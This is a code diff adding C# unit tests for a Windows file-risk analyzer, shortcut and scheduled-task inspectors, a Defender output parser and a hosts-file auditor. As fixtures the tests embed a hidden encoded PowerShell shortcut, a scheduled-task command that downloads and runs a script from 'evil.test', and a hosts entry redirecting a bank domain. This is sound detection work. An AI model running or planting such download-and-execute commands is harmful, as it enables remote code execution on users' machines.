@@ -290,3 +290,120 @@ public class SoundSynthesizerTests
         Assert.Equal(261.626, SoundSynthesizer.Frequency("C4"), 2);
     }
 }
+
+public class FileRiskAnalyzerTests
+{
+    private static readonly byte[] ExecutableHeader = { (byte)'M', (byte)'Z', 0x90, 0 };
+
+    private static FileFacts Facts(string path, byte[]? header = null, bool? signed = null, bool hidden = false, int ageDays = 100, double entropy = 5, long size = 200 * 1024)
+    {
+        DateTime time = DateTime.UtcNow.AddDays(-ageDays);
+        return new FileFacts { Path = path, Header = header ?? Array.Empty<byte>(), HasValidSignature = signed, Hidden = hidden, CreatedUtc = time, ModifiedUtc = time, Entropy = entropy, Size = size };
+    }
+
+    [Fact]
+    public void DoubleExtensionInDownloadsIsHighRisk()
+    {
+        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Users\Ivan\Downloads\photo.jpg.exe", ExecutableHeader, signed: false, ageDays: 1), DateTime.UtcNow);
+
+        Assert.Equal(RiskLevel.High, risk.Level);
+        Assert.Contains(risk.Reasons, reason => reason.Description.Contains("Двойное расширение"));
+    }
+
+    [Fact]
+    public void SignedProgramInProgramFilesIsNotRisky()
+    {
+        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Program Files\App\app.exe", ExecutableHeader, signed: true), DateTime.UtcNow);
+
+        Assert.Equal(RiskLevel.None, risk.Level);
+    }
+
+    [Fact]
+    public void ProgramDisguisedAsDocumentIsDetected()
+    {
+        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Users\Ivan\Documents\invoice.pdf", ExecutableHeader), DateTime.UtcNow);
+
+        Assert.True(risk.Score >= 55);
+    }
+
+    [Fact]
+    public void RightToLeftOverrideIsDetected()
+    {
+        FileRisk risk = FileRiskAnalyzer.Analyze(Facts("C:\\Users\\Ivan\\Downloads\\report\u202Efdp.exe", ExecutableHeader), DateTime.UtcNow);
+
+        Assert.Equal(RiskLevel.High, risk.Level);
+    }
+
+    [Fact]
+    public void PlannerPutsMostDangerousFirst()
+    {
+        var files = new[]
+        {
+            Facts(@"C:\Program Files\App\safe.exe", ExecutableHeader, signed: true),
+            Facts(@"C:\Users\Ivan\AppData\Local\Temp\x.scr", ExecutableHeader, signed: false, hidden: true, ageDays: 0)
+        };
+
+        IReadOnlyList<FileRisk> ranked = SmartScanPlanner.RankFiles(files, DateTime.UtcNow);
+
+        Assert.EndsWith("x.scr", ranked[0].Path);
+    }
+
+    [Fact]
+    public void EntropyOfRandomDataIsHigh()
+    {
+        byte[] random = new byte[65536];
+        new Random(1).NextBytes(random);
+
+        Assert.True(FileRiskAnalyzer.CalculateEntropy(random) > 7.9);
+        Assert.Equal(0, FileRiskAnalyzer.CalculateEntropy(new byte[100]));
+    }
+}
+
+public class ShortcutAndTaskTests
+{
+    [Fact]
+    public void FindsHiddenPowerShellInShortcut()
+    {
+        byte[] content = Encoding.Unicode.GetBytes("xx\0C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0-w hidden -enc SQBFAFgA\0");
+
+        IReadOnlyList<string> markers = ShortcutInspector.InspectShortcut(content);
+
+        Assert.Contains("powershell", markers);
+        Assert.Contains("-w hidden", markers);
+    }
+
+    [Fact]
+    public void ParsesScheduledTaskAndFlagsAppDataPowerShell()
+    {
+        string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c iex (iwr http://evil.test/a.ps1)</Arguments></Exec></Actions></Task>";
+
+        ScheduledTaskAction action = ScheduledTaskInspector.ParseTaskXml("Updater", xml).Single();
+        IReadOnlyList<RiskReason> reasons = ScheduledTaskInspector.Assess(action);
+
+        Assert.True(action.Hidden);
+        Assert.True(reasons.Sum(reason => reason.Points) >= 50);
+    }
+
+    [Fact]
+    public void ParsesDefenderThreatName()
+    {
+        string output = "Scan starting...\r\nScan finished.\r\nScanning C:\\x\\eicar.com found 1 threats.\r\n<===========================LIST OF DETECTED THREATS==========================>\r\n----------------------------- Threat information ------------------------------\r\nThreat                  : Virus:DOS/EICAR_Test_File\r\nResources               : 1 total\r\n";
+
+        Assert.Equal("Virus:DOS/EICAR_Test_File", DefenderOutput.ParseThreatName(output));
+    }
+}
+
+public class HostsAuditTests
+{
+    [Fact]
+    public void FindsRedirectedBankButIgnoresAsaBlockAndLocalhost()
+    {
+        string hosts = "127.0.0.1 localhost\r\n6.6.6.6 www.sberbank.ru\r\n0.0.0.0 ads.example.com\r\n" + HostsBlocker.ApplyBlockList("", new[] { "evil.test" });
+
+        var suspicious = HostsAudit.FindSuspiciousRedirects(hosts);
+
+        Assert.Single(suspicious);
+        Assert.Equal("www.sberbank.ru", suspicious[0].Domain);
+        Assert.DoesNotContain("sberbank", HostsAudit.RemoveEntries(hosts, new[] { "www.sberbank.ru" }));
+    }
+}
